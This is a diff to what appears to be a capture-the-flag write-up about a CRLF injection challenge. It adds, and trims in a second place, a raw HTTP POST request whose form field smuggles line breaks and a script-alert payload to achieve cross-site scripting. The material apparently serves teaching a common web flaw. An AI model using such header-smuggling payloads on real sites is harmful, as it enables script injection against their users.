@@ -604,6 +604,22 @@ K0{CRLF_is_very_common_vulnerability}
 
 |
 
+```bash
+POST /report HTTP/1.1
+Host: war.knock-on.org:10013
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 57
+
+header=
+
+<script>alert()</script>
+&value
+```
+
+코드 다이어트
+
+|
+
 |
 
 |
@@ -630,10 +646,10 @@ Host: war.knock-on.org:10013
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 57
 
-header=header1
+header=
 
 <script>alert()</script>
-&value=value1
+&value
 ```
 
 |
